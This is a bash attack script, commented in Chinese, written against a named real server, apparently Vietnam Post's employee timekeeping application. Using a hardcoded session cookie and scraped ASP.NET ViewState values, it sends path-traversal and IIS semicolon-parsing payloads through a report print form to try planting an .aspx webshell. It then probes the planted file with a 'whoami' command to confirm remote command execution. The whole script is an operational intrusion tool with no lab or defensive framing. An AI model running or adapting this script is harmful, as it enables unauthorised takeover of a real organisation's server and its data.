#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥🔥🔥 深度利用Print功能GetShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 获取ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试1] Print + 路径遍历写WebShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

PRINT_PAYLOADS=(
    "../../../inetpub/wwwroot/chamcong/shell|.aspx"
    "../../../inetpub/wwwroot/shell|.aspx"
    "../../shell|.aspx"
    "../shell|.aspx"
    "shell|.aspx"
)

for payload in "${PRINT_PAYLOADS[@]}"; do
    IFS='|' read thang nam <<< "$payload"
    echo ""
    echo "  测试: txtThang='$thang' + txtNam='$nam'"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=$thang" \
        --data-urlencode "txtNam=$nam" \
        --data-urlencode "btnIn=In" \
        -o "print_test_${payload//\|/_}.html" 2>&1
    
    size=$(wc -c < "print_test_${payload//\|/_}.html")
    echo "    响应: $size bytes"
    
    # 检查错误
    if grep -qi "error\|exception\|could not find" "print_test_${payload//\|/_}.html"; then
        echo "    ❌ 有错误"
        grep -i "error\|exception" "print_test_${payload//\|/_}.html" | head -2
    else
        echo "    ✅ 无错误！可能成功！"
        
        # 尝试访问可能的路径
        possible_paths=(
            "/chamcong/shell.aspx"
            "/shell.aspx"
            "/chamcong/shell${nam}"
        )
        
        for path in "${possible_paths[@]}"; do
            echo -n "      尝试访问: $path: "
            verify=$(curl -sk "http://vps.vnpost.vn${path}?c=whoami" -w "%{http_code}" 2>&1)
            http_code=$(echo "$verify" | tail -c 4)
            
            if [ "$http_code" == "200" ]; then
                echo "✅ 200"
                if echo "$verify" | grep -qiE "nt authority|iis|network|user"; then
                    echo ""
                    echo "      🔥🔥🔥🔥🔥 GetShell成功！"
                    echo "      WebShell: http://vps.vnpost.vn${path}?c=COMMAND"
                    echo "$verify" | head -30
                    exit 0
                fi
            else
                echo "$http_code"
            fi
        done
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试2] Print功能详细分析"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  基线测试（正常Print）..."
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnIn=In" \
    -o print_baseline.html 2>&1

baseline_size=$(wc -c < print_baseline.html)
echo "    基线大小: $baseline_size bytes"

# 查看内容类型
echo ""
echo "    响应头信息:"
curl -sI "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnIn=In" | grep -i "content-"

# 检查是否是HTML还是二进制
if file print_baseline.html | grep -qi "html\|ascii"; then
    echo "    ✅ 是HTML响应"
    
    # 查找文件路径/URL
    echo ""
    echo "    查找可能的文件路径..."
    grep -oE "(C:\\\\[^<\"']+|/[a-zA-Z0-9/_.-]+\.pdf)" print_baseline.html | head -10
    
else
    echo "    🔥 可能是二进制文件（PDF等）"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试3] Print + IIS解析漏洞组合"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

IIS_COMBOS=(
    "../../../inetpub/wwwroot/chamcong/x.asp;|.jpg"
    "../../../inetpub/wwwroot/chamcong/x.aspx;|.jpg"
    "../../../inetpub/wwwroot/chamcong/x.cer;|.jpg"
)

for combo in "${IIS_COMBOS[@]}"; do
    IFS='|' read thang nam <<< "$combo"
    echo ""
    echo "  测试: $thang + $nam"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=$thang" \
        --data-urlencode "txtNam=$nam" \
        --data-urlencode "btnIn=In" \
        -o "print_iis_${combo//\|/_}.html" 2>&1
    
    size=$(wc -c < "print_iis_${combo//\|/_}.html")
    echo "    响应: $size bytes"
    
    if ! grep -qi "error\|exception" "print_iis_${combo//\|/_}.html"; then
        echo "    ✅ 无错误！"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试4] 所有3个BC报表测试Print"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

for bc_id in "BC01" "BC02" "BC03"; do
    echo ""
    echo "  测试 $bc_id..."
    
    # 获取ViewState
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${bc_id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    # Print with path traversal
    curl -sk "${BASE}/report/inBCC.aspx?ID=${bc_id}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=../../../inetpub/wwwroot/chamcong/test_${bc_id}" \
        --data-urlencode "txtNam=.aspx" \
        --data-urlencode "btnIn=In" \
        -o "print_bc_${bc_id}.html" 2>&1
    
    size=$(wc -c < "print_bc_${bc_id}.html")
    echo "    响应: $size bytes"
    
    if ! grep -qi "error\|exception\|could not find" "print_bc_${bc_id}.html"; then
        echo "    🔥🔥🔥 $bc_id Print无错误！"
        
        # 尝试访问
        echo -n "      访问测试: "
        curl -sk "http://vps.vnpost.vn/chamcong/test_${bc_id}.aspx" -w "%{http_code}\n" -o /dev/null 2>&1
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ Print功能深度测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
